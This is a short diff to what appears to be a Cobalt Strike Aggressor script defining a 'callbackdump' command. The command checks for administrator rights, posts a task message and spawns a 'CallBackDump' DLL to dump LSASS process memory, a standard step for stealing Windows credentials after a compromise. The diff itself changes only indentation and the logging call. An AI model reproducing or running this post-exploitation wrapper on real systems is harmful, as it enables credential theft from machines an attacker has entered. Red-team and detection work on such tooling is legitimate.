@@ -1,9 +1,11 @@
 alias callbackdump {
-    if (!-isadmin $1) {
+	if (!-isadmin $1) {
         berror($1, "Please use administrator privileges!");
         return;
     }
-    blog($1, "Start Dump lsass , please wait...");
+	
+    btask($1, "Tasked start dump lsass , please wait...");
+   
     bdllspawn($1, script_resource("CallBackDump.".barch($1).".dll"), $2, "CallBackDump", 5000, false);
 }
 
